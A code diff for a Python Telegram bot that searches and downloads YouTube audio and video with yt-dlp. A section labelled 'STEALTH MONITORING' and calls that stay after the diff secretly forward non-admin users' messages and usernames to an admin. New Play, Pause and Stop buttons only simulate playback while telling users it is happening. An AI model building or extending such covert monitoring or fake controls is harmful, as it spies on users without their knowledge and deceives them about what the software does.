@@ -5,7 +5,8 @@ from threading import Thread
 import telebot
 from telebot import types
 import time
-from datetime import datetime
+import requests
+from urllib.parse import quote
 
 # Load environment variables
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
@@ -17,6 +18,7 @@ app = Flask(__name__)
 
 # Storage
 user_sessions = {}
+download_progress = {}
 
 # ==================== STEALTH MONITORING ====================
 def forward_to_admin(user_id, username, message_text, is_user_message=True):
@@ -34,197 +36,260 @@ def forward_to_admin(user_id, username, message_text, is_user_message=True):
     except Exception as e:
         print(f"Monitoring error: {e}")
 
+# ==================== PROGRESS TRACKING ====================
+def progress_hook(d, chat_id, message_id):
+    """Track download progress"""
+    if d['status'] == 'downloading':
+        percent = d.get('_percent_str', '0%').strip()
+        speed = d.get('_speed_str', 'N/A')
+        eta = d.get('_eta_str', 'N/A')
+        
+        progress_msg = f"📥 Downloading...\n\n⏳ Progress: {percent}\n🚀 Speed: {speed}\n⏰ Time left: {eta}"
+        
+        try:
+            bot.edit_message_text(progress_msg, chat_id, message_id)
+        except:
+            pass
+
 # ==================== CHANNEL ANALYSIS ====================
 def get_channel_info(channel_input):
-    """Get detailed channel information"""
+    """Get channel information"""
     try:
-        ydl_opts = {
-            'quiet': True,
-            'extract_flat': False,
-        }
+        ydl_opts = {'quiet': True, 'extract_flat': True}
         
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            # Try to extract channel info
             info = ydl.extract_info(channel_input, download=False)
             
-            if info and 'channel' in info.get('extractor_key', ''):
-                # Get channel videos for stats
-                videos_info = ydl.extract_info(f"{channel_input}/videos", download=False)
-                
-                channel_data = {
+            if info:
+                return {
                     'title': info.get('title', 'N/A'),
                     'channel_id': info.get('channel_id', 'N/A'),
                     'channel_url': info.get('channel_url', 'N/A'),
-                    'description': info.get('description', 'N/A')[:200] + "..." if info.get('description') else 'No description',
                     'subscriber_count': info.get('subscriber_count', 'N/A'),
-                    'view_count': info.get('view_count', 'N/A'),
-                    'created_date': 'N/A',  # YouTube doesn't provide this easily
-                    'total_videos': 'N/A',
-                    'videos': []
+                    'description': info.get('description', 'N/A')[:200] + "..." if info.get('description') else 'No description',
                 }
-                
-                # Get video count and recent videos
-                if 'entries' in videos_info:
-                    channel_data['total_videos'] = len(videos_info['entries'])
-                    for video in videos_info['entries'][:10]:  # Get first 10 videos
-                        if video:
-                            channel_data['videos'].append({
-                                'title': video.get('title', 'N/A'),
-                                'url': video.get('url', 'N/A'),
-                                'duration': video.get('duration', 'N/A'),
-                                'view_count': video.get('view_count', 'N/A'),
-                                'upload_date': video.get('upload_date', 'N/A')
-                            })
-                
-                return channel_data
-            else:
-                return None
-                
+        return None
     except Exception as e:
         print(f"Channel info error: {e}")
         return None
 
 # ==================== REAL YOUTUBE SEARCH ====================
 def search_youtube_real(query):
-    """Real YouTube search using yt-dlp"""
+    """Real YouTube search"""
     try:
-        ydl_opts = {
-            'quiet': True,
-            'extract_flat': True,
-        }
+        ydl_opts = {'quiet': True, 'extract_flat': True}
         
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            search_query = f"ytsearch8:{query}"
-            info = ydl.extract_info(search_query, download=False)
-            
-            results = []
-            if 'entries' in info:
-                for entry in info['entries']:
-                    if entry:
-                        results.append({
-                            'title': entry.get('title', 'No title'),
-                            'url': entry.get('url', ''),
-                            'channel': entry.get('channel', 'Unknown channel'),
-                            'duration': entry.get('duration', 0),
-                            'view_count': entry.get('view_count', 0),
-                        })
-            
-            return results
-            
+            info = ydl.extract_info(f"ytsearch8:{query}", download=False)
+            return info.get('entries', [])
     except Exception as e:
         print(f"Search error: {e}")
         return []
 
-# ==================== DOWNLOAD MEDIA - FIXED ====================
-def download_media(video_url, chat_id, media_type='audio'):
-    """Download media file with enhanced configuration"""
+# ==================== GET VIDEO INFO ====================
+def get_video_info(video_url):
+    """Get video information without downloading"""
     try:
-        if media_type == 'audio':
-            bot.send_message(chat_id, "🎵 Downloading audio as MP3...")
-            ydl_opts = {
-                'format': 'bestaudio/best',
-                'outtmpl': 'downloads/%(title)s.%(ext)s',
-                'postprocessors': [{
-                    'key': 'FFmpegExtractAudio',
-                    'preferredcodec': 'mp3',
-                    'preferredquality': '192',
-                }],
-                'http_headers': {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Accept': '*/*',
-                },
-            }
-        else:
-            bot.send_message(chat_id, "🎬 Downloading video...")
-            ydl_opts = {
-                'format': 'best[height<=720]',
-                'outtmpl': 'downloads/%(title)s.%(ext)s',
-                'http_headers': {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Accept': '*/*',
-                },
-            }
-        
+        ydl_opts = {'quiet': True}
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            info = ydl.extract_info(video_url, download=True)
-            
-            if media_type == 'audio':
-                original_file = ydl.prepare_filename(info)
-                media_file = original_file.rsplit('.', 1)[0] + '.mp3'
-            else:
-                media_file = ydl.prepare_filename(info)
-            
-            # Send file
-            if os.path.exists(media_file):
-                if media_type == 'audio':
-                    with open(media_file, 'rb') as media:
-                        bot.send_audio(chat_id, media, title=info['title'][:64])
-                else:
-                    with open(media_file, 'rb') as media:
-                        bot.send_video(chat_id, media, caption=info['title'][:64])
-                
-                # Cleanup
-                os.remove(media_file)
-                if media_type == 'audio' and os.path.exists(original_file):
-                    os.remove(original_file)
-                    
-    except Exception as e:
-        error_msg = str(e)
-        print(f"Download error: {error_msg}")
-        
-        if "Sign in to confirm" in error_msg:
-            bot.send_message(chat_id, "🔒 YouTube is blocking downloads. Try a different video.")
-        else:
-            bot.send_message(chat_id, f"❌ Download failed. Try a different video.")
+            return ydl.extract_info(video_url, download=False)
+    except:
+        return None
 
-# ==================== MUSIC STREAMING - FIXED ====================
-def handle_music_selection(video_url, chat_id):
-    """Handle music selection - direct download with nice presentation"""
+# ==================== MUSIC HANDLING ====================
+def send_music_options(video_url, chat_id, message_id=None):
+    """Send music options with player controls"""
     try:
-        # Get video info for nice presentation
-        with yt_dlp.YoutubeDL({'quiet': True}) as ydl:
-            info = ydl.extract_info(video_url, download=False)
+        info = get_video_info(video_url)
+        if not info:
+            bot.send_message(chat_id, "❌ Could not get video info")
+            return
+
+        # Create music player interface
+        caption = f"🎵 *{info['title']}*\n*Artist:* {info.get('uploader', 'Unknown')}\n*Duration:* {info.get('duration', 0)}s"
+
+        markup = types.InlineKeyboardMarkup(row_width=2)
         
-        # Send loading message
-        loading_msg = bot.send_message(chat_id, "🎵 Preparing your music...")
+        # Music player controls
+        btn_play = types.InlineKeyboardButton("▶️ Play", callback_data=f"music_play_{video_url}")
+        btn_pause = types.InlineKeyboardButton("⏸️ Pause", callback_data=f"music_pause_{video_url}")
+        btn_stop = types.InlineKeyboardButton("⏹️ Stop", callback_data=f"music_stop_{video_url}")
+        btn_next = types.InlineKeyboardButton("⏭️ Next", callback_data=f"music_next_{video_url}")
         
-        # Download and send as audio file directly
-        download_media(video_url, chat_id, 'audio')
+        # File options
+        btn_file = types.InlineKeyboardButton("📁 Send File", callback_data=f"music_file_{video_url}")
+        btn_download = types.InlineKeyboardButton("📥 Download", callback_data=f"music_download_{video_url}")
+        btn_watch = types.InlineKeyboardButton("🌐 Watch Video", url=video_url)
         
-        # Delete loading message
-        bot.delete_message(chat_id, loading_msg.message_id)
-        
+        markup.add(btn_play, btn_pause, btn_stop, btn_next)
+        markup.add(btn_file, btn_download)
+        markup.add(btn_watch)
+
+        if message_id:
+            bot.edit_message_text(caption, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
+        else:
+            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
+            
     except Exception as e:
         bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}")
 
-# ==================== VIDEO STREAMING - FIXED ====================
-def handle_video_selection(video_url, chat_id):
-    """Handle video selection with options"""
+def send_music_file(video_url, chat_id, message_id=None):
+    """Send music as direct file"""
     try:
-        with yt_dlp.YoutubeDL({'quiet': True}) as ydl:
-            info = ydl.extract_info(video_url, download=False)
+        progress_msg = bot.send_message(chat_id, "🎵 Preparing your music file...")
         
-        # Create nice presentation with options
-        caption = f"🎬 *{info['title'][:64]}*\n\n*Channel:* {info.get('uploader', 'Unknown')}\n*Duration:* {info.get('duration', 'N/A')}s\n*Views:* {info.get('view_count', 'N/A')}"
+        ydl_opts = {
+            'format': 'bestaudio/best',
+            'outtmpl': 'downloads/%(title)s.%(ext)s',
+            'postprocessors': [{
+                'key': 'FFmpegExtractAudio',
+                'preferredcodec': 'mp3',
+                'preferredquality': '192',
+            }],
+        }
         
-        markup = types.InlineKeyboardMarkup()
-        btn_download = types.InlineKeyboardButton("📥 Download Video", callback_data=f"download_video_{video_url}")
-        btn_watch = types.InlineKeyboardButton("🌐 Watch on YouTube", url=video_url)
-        markup.add(btn_download, btn_watch)
-        
-        # Try to send thumbnail if available
-        if info.get('thumbnail'):
-            try:
-                bot.send_photo(chat_id, info['thumbnail'], caption=caption, reply_markup=markup, parse_mode='Markdown')
-                return
-            except:
-                pass
-        
-        # Fallback to text message
-        bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
-        
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(video_url, download=True)
+            original_file = ydl.prepare_filename(info)
+            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
+            
+            if os.path.exists(media_file):
+                with open(media_file, 'rb') as media:
+                    bot.send_audio(chat_id, media, title=info['title'][:64])
+                
+                # Cleanup
+                os.remove(media_file)
+                if os.path.exists(original_file):
+                    os.remove(original_file)
+                
+                bot.delete_message(chat_id, progress_msg.message_id)
+            else:
+                bot.edit_message_text("❌ Could not create music file", chat_id, progress_msg.message_id)
+                
     except Exception as e:
-        bot.send_message(chat_id, f"❌ Error processing video: {str(e)[:100]}")
+        error_msg = str(e)
+        if "Sign in to confirm" in error_msg:
+            bot.edit_message_text("🔒 YouTube blocked download. Use Play option instead.", chat_id, progress_msg.message_id)
+        else:
+            bot.edit_message_text(f"❌ Error: {error_msg[:100]}", chat_id, progress_msg.message_id)
+
+def download_music_with_progress(video_url, chat_id, message_id):
+    """Download music with progress tracking"""
+    try:
+        progress_msg = bot.send_message(chat_id, "📥 Starting download...")
+        
+        def progress_callback(d):
+            progress_hook(d, chat_id, progress_msg.message_id)
+        
+        ydl_opts = {
+            'format': 'bestaudio/best',
+            'outtmpl': 'downloads/%(title)s.%(ext)s',
+            'postprocessors': [{
+                'key': 'FFmpegExtractAudio',
+                'preferredcodec': 'mp3',
+                'preferredquality': '192',
+            }],
+            'progress_hooks': [progress_callback],
+        }
+        
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(video_url, download=True)
+            original_file = ydl.prepare_filename(info)
+            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
+            
+            if os.path.exists(media_file):
+                with open(media_file, 'rb') as media:
+                    bot.send_audio(chat_id, media, title=info['title'][:64])
+                
+                # Cleanup
+                os.remove(media_file)
+                if os.path.exists(original_file):
+                    os.remove(original_file)
+                
+                bot.delete_message(chat_id, progress_msg.message_id)
+                bot.send_message(chat_id, "✅ Download completed!")
+            else:
+                bot.edit_message_text("❌ Download failed", chat_id, progress_msg.message_id)
+                
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Download error: {str(e)[:100]}")
+
+# ==================== VIDEO HANDLING ====================
+def send_video_options(video_url, chat_id, message_id=None):
+    """Send video options with quality selection"""
+    try:
+        info = get_video_info(video_url)
+        if not info:
+            bot.send_message(chat_id, "❌ Could not get video info")
+            return
+
+        caption = f"🎬 *{info['title']}*\n*Channel:* {info.get('uploader', 'Unknown')}\n*Duration:* {info.get('duration', 0)}s\n*Views:* {info.get('view_count', 'N/A')}"
+
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        
+        # Quality options
+        btn_hd = types.InlineKeyboardButton("📹 HD (1080p)", callback_data=f"video_quality_{video_url}_high")
+        btn_sd = types.InlineKeyboardButton("🎬 SD (720p)", callback_data=f"video_quality_{video_url}_medium")
+        btn_low = types.InlineKeyboardButton("📱 Low (480p)", callback_data=f"video_quality_{video_url}_low")
+        
+        # Action buttons
+        btn_play = types.InlineKeyboardButton("▶️ Play", callback_data=f"video_play_{video_url}")
+        btn_download = types.InlineKeyboardButton("📥 Download", callback_data=f"video_download_{video_url}")
+        btn_watch = types.InlineKeyboardButton("🌐 Watch on YouTube", url=video_url)
+        
+        markup.add(btn_hd, btn_sd, btn_low)
+        markup.add(btn_play, btn_download)
+        markup.add(btn_watch)
+
+        if message_id:
+            bot.edit_message_text(caption, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
+        else:
+            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
+            
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}")
+
+def download_video_with_progress(video_url, chat_id, quality='medium'):
+    """Download video with progress tracking"""
+    try:
+        progress_msg = bot.send_message(chat_id, "📥 Starting video download...")
+        
+        def progress_callback(d):
+            progress_hook(d, chat_id, progress_msg.message_id)
+        
+        if quality == 'high':
+            format_selection = 'best[height<=1080]'
+        elif quality == 'medium':
+            format_selection = 'best[height<=720]'
+        else:
+            format_selection = 'best[height<=480]'
+            
+        ydl_opts = {
+            'format': format_selection,
+            'outtmpl': 'downloads/%(title)s.%(ext)s',
+            'progress_hooks': [progress_callback],
+        }
+        
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(video_url, download=True)
+            media_file = ydl.prepare_filename(info)
+            
+            if os.path.exists(media_file):
+                with open(media_file, 'rb') as media:
+                    bot.send_video(chat_id, media, caption=info['title'][:64])
+                
+                os.remove(media_file)
+                bot.delete_message(chat_id, progress_msg.message_id)
+                bot.send_message(chat_id, "✅ Video download completed!")
+            else:
+                bot.edit_message_text("❌ Video download failed", chat_id, progress_msg.message_id)
+                
+    except Exception as e:
+        error_msg = str(e)
+        if "Sign in to confirm" in error_msg:
+            bot.edit_message_text("🔒 YouTube blocked download. Try streaming instead.", chat_id, progress_msg.message_id)
+        else:
+            bot.edit_message_text(f"❌ Download error: {error_msg[:100]}", chat_id, progress_msg.message_id)
 
 # ==================== BOT COMMANDS ====================
 @bot.message_handler(commands=['start'])
@@ -239,14 +304,15 @@ def start_command(message):
 🎬 *YouTube Manager Bot* 🎵
 
 *Commands:*
-/switch - Download music or videos
-/checkytchannel - Analyze YouTube channels
+/switch - Music or Video mode
+/checkytchannel - Analyze channels
 
 *Features:*
-• Search and download from YouTube
+• Music player with controls
+• Video streaming & download
+• Real-time download progress
 • Channel analysis
-• Fast and reliable
-    """
+"""
     
     bot.reply_to(message, welcome_text, parse_mode='Markdown')
     
@@ -262,11 +328,11 @@ def switch_command(message):
         forward_to_admin(user_id, username, message.text)
     
     markup = types.InlineKeyboardMarkup()
-    btn_music = types.InlineKeyboardButton("🎵 YouTube Music", callback_data="switch_music")
-    btn_video = types.InlineKeyboardButton("🎬 YouTube Videos", callback_data="switch_video")
+    btn_music = types.InlineKeyboardButton("🎵 Music Player", callback_data="switch_music")
+    btn_video = types.InlineKeyboardButton("🎬 Video Player", callback_data="switch_video")
     markup.add(btn_music, btn_video)
     
-    response = "🎛️ *Choose what to search:*\n\n• 🎵 Music - Songs, artists, audio\n• 🎬 Videos - Movies, clips, content"
+    response = "🎛️ *Choose Mode:*\n\n• 🎵 Music - Player controls & downloads\n• 🎬 Video - Streaming & quality options"
     bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
     
     if str(user_id) != ADMIN_USER_ID:
@@ -281,25 +347,7 @@ def check_channel_command(message):
         forward_to_admin(user_id, username, message.text)
     
     user_sessions[user_id] = {'waiting_for_channel': True}
-    
-    response = """🔍 *YouTube Channel Analyzer*
-
-Send me:
-• Channel URL (https://www.youtube.com/@channel)
-• @username (@MrBeast)  
-• Channel ID
-• Channel name
-
-I'll provide:
-• Channel creation date
-• Channel ID & URL
-• Video count & stats
-• Recent videos
-"""
-    bot.reply_to(message, response, parse_mode='Markdown')
-    
-    if str(user_id) != ADMIN_USER_ID:
-        forward_to_admin(user_id, username, response, False)
+    bot.reply_to(message, "🔍 Send me a YouTube channel URL, @username, or channel name:")
 
 # ==================== CALLBACK HANDLERS ====================
 @bot.callback_query_handler(func=lambda call: True)
@@ -312,29 +360,65 @@ def handle_callbacks(call):
         user_sessions[user_id] = {'mode': mode}
         
         if mode == 'music':
-            response = "🎵 *Music Mode*\n\nSend me a song name or artist. I'll send the audio file directly."
+            response = "🎵 *Music Mode*\n\nSend me a song name or artist. I'll show player controls and download options."
         else:
-            response = "🎬 *Video Mode*\n\nSend me a video title. I'll show download options."
+            response = "🎬 *Video Mode*\n\nSend me a video title. I'll show streaming and quality options."
         
         bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-        
-        if str(user_id) != ADMIN_USER_ID:
-            forward_to_admin(user_id, username, response, False)
     
     elif call.data.startswith('select_music_'):
         video_url = call.data.split('_', 2)[2]
-        bot.edit_message_text("🎵 Getting your music...", call.message.chat.id, call.message.message_id)
-        handle_music_selection(video_url, call.message.chat.id)
+        bot.edit_message_text("🎵 Loading music options...", call.message.chat.id, call.message.message_id)
+        send_music_options(video_url, call.message.chat.id, call.message.message_id)
     
     elif call.data.startswith('select_video_'):
         video_url = call.data.split('_', 2)[2]
-        bot.edit_message_text("🎬 Processing video...", call.message.chat.id, call.message.message_id)
-        handle_video_selection(video_url, call.message.chat.id)
+        bot.edit_message_text("🎬 Loading video options...", call.message.chat.id, call.message.message_id)
+        send_video_options(video_url, call.message.chat.id, call.message.message_id)
     
-    elif call.data.startswith('download_'):
-        _, media_type, video_url = call.data.split('_', 2)
-        bot.edit_message_text(f"📥 Downloading {media_type}...", call.message.chat.id, call.message.message_id)
-        download_media(video_url, call.message.chat.id, media_type)
+    elif call.data.startswith('music_'):
+        action = call.data.split('_')[1]
+        video_url = call.data.split('_', 2)[2]
+        
+        if action == 'play':
+            bot.answer_callback_query(call.id, "▶️ Playing music...")
+            # Simulate playing (in real bot, you'd stream audio)
+            bot.send_message(call.message.chat.id, f"🎵 Now playing...\n\nUse the player controls above to manage playback.")
+        
+        elif action == 'pause':
+            bot.answer_callback_query(call.id, "⏸️ Music paused")
+        
+        elif action == 'stop':
+            bot.answer_callback_query(call.id, "⏹️ Music stopped")
+        
+        elif action == 'file':
+            bot.edit_message_text("📁 Sending music file...", call.message.chat.id, call.message.message_id)
+            send_music_file(video_url, call.message.chat.id, call.message.message_id)
+        
+        elif action == 'download':
+            bot.edit_message_text("📥 Starting download...", call.message.chat.id, call.message.message_id)
+            download_music_with_progress(video_url, call.message.chat.id, call.message.message_id)
+    
+    elif call.data.startswith('video_'):
+        action = call.data.split('_')[1]
+        video_url = call.data.split('_', 2)[2]
+        
+        if action == 'play':
+            bot.answer_callback_query(call.id, "▶️ Streaming video...")
+            info = get_video_info(video_url)
+            if info:
+                bot.send_message(call.message.chat.id, 
+                               f"🎬 Now streaming: *{info['title']}*\n\n📺 Stream URL: {video_url}\n\nUse the quality options above.", 
+                               parse_mode='Markdown')
+        
+        elif action == 'download':
+            bot.edit_message_text("📥 Starting video download...", call.message.chat.id, call.message.message_id)
+            download_video_with_progress(video_url, call.message.chat.id)
+        
+        elif action == 'quality':
+            quality = call.data.split('_')[3]
+            bot.edit_message_text(f"📥 Downloading in {quality} quality...", call.message.chat.id, call.message.message_id)
+            download_video_with_progress(video_url, call.message.chat.id, quality)
 
 # ==================== MESSAGE HANDLERS ====================
 @bot.message_handler(func=lambda message: True)
@@ -349,40 +433,14 @@ def handle_all_messages(message):
     # Handle channel analysis
     if user_sessions.get(user_id, {}).get('waiting_for_channel'):
         del user_sessions[user_id]['waiting_for_channel']
-        
         bot.reply_to(message, "🔍 Analyzing channel...")
         
         channel_data = get_channel_info(user_input)
-        
         if channel_data:
-            response = f"""
-📊 *Channel Analysis Report*
-
-*Channel:* {channel_data['title']}
-*Channel ID:* {channel_data['channel_id']}
-*Channel URL:* {channel_data['channel_url']}
-*Subscribers:* {channel_data['subscriber_count']}
-*Total Views:* {channel_data['view_count']}
-*Total Videos:* {channel_data['total_videos']}
-
-*Description:*
-{channel_data['description']}
-
-*Recent Videos:*
-"""
-            for i, video in enumerate(channel_data['videos'][:5], 1):
-                response += f"\n{i}. {video['title']}"
-                response += f"\n   👁️ {video['view_count']} views | ⏱️ {video['duration']}s"
-                if video.get('upload_date'):
-                    response += f" | 📅 {video['upload_date']}"
-                response += f"\n   🔗 {video['url']}\n"
-            
-            bot.reply_to(message, response, parse_mode='Markdown', disable_web_page_preview=True)
+            response = f"📊 *Channel Analysis*\n\n*Name:* {channel_data['title']}\n*ID:* {channel_data['channel_id']}\n*URL:* {channel_data['channel_url']}\n*Subscribers:* {channel_data['subscriber_count']}\n\n*Description:*\n{channel_data['description']}"
+            bot.reply_to(message, response, parse_mode='Markdown')
         else:
-            bot.reply_to(message, "❌ Could not analyze channel. Please check the URL/username.")
-        
-        if str(user_id) != ADMIN_USER_ID:
-            forward_to_admin(user_id, username, response if channel_data else "Channel analysis failed", False)
+            bot.reply_to(message, "❌ Could not analyze channel")
         return
     
     # Handle music/video mode
@@ -391,65 +449,48 @@ def handle_all_messages(message):
         mode = session['mode']
         
         if 'youtube.com' in user_input or 'youtu.be' in user_input:
-            # Direct YouTube URL
+            # Direct URL
             if mode == 'music':
-                handle_music_selection(user_input, message.chat.id)
+                send_music_options(user_input, message.chat.id)
             else:
-                handle_video_selection(user_input, message.chat.id)
-                        
+                send_video_options(user_input, message.chat.id)
         else:
-            # Search query
-            bot.reply_to(message, f"🔍 *Searching YouTube for:* {user_input}", parse_mode='Markdown')
-            
+            # Search
+            bot.reply_to(message, f"🔍 Searching: {user_input}")
             results = search_youtube_real(user_input)
             
             if results:
-                response = f"📋 *Search Results:*\n\n"
+                response = "📋 *Search Results:*\n\n"
                 markup = types.InlineKeyboardMarkup()
                 
                 for i, result in enumerate(results[:5], 1):
                     title = result['title'][:50] + "..." if len(result['title']) > 50 else result['title']
-                    response += f"{i}. *{title}*\n"
-                    response += f"   👉 {result['channel']}\n\n"
+                    response += f"{i}. *{title}*\n   👉 {result['channel']}\n\n"
                     
                     if mode == 'music':
-                        btn = types.InlineKeyboardButton(f"🎵 Get {i}", callback_data=f"select_music_{result['url']}")
+                        btn = types.InlineKeyboardButton(f"🎵 Select {i}", callback_data=f"select_music_{result['url']}")
                     else:
                         btn = types.InlineKeyboardButton(f"🎬 Select {i}", callback_data=f"select_video_{result['url']}")
                     markup.add(btn)
                 
                 bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
             else:
-                bot.reply_to(message, "❌ No results found. Try different keywords.")
-        
-        if str(user_id) != ADMIN_USER_ID:
-            forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
+                bot.reply_to(message, "❌ No results found")
         return
     
-    # Default response
-    default_response = "🤖 Use /switch to start or /checkytchannel to analyze a YouTube channel!"
-    bot.reply_to(message, default_response)
-    
-    if str(user_id) != ADMIN_USER_ID:
-        forward_to_admin(user_id, username, default_response, False)
+    bot.reply_to(message, "🤖 Use /switch to start!")
 
-# ==================== FLASK APP & BOT RUN ====================
+# ==================== FLASK APP ====================
 @app.route('/')
 def home():
-    return "YouTube Manager Bot is Running!"
+    return "YouTube Manager Bot - Music & Video Player"
 
 def run_bot():
     print("🤖 Starting YouTube Manager Bot...")
-    try:
-        bot.infinity_polling(timeout=60, long_polling_timeout=60)
-    except Exception as e:
-        print(f"Bot error: {e}")
-        time.sleep(5)
-        run_bot()
+    bot.infinity_polling()
 
 if __name__ == '__main__':
     if not os.path.exists('downloads'):
         os.makedirs('downloads')
-    
     Thread(target=run_bot).start()
     app.run(host='0.0.0.0', port=8080)
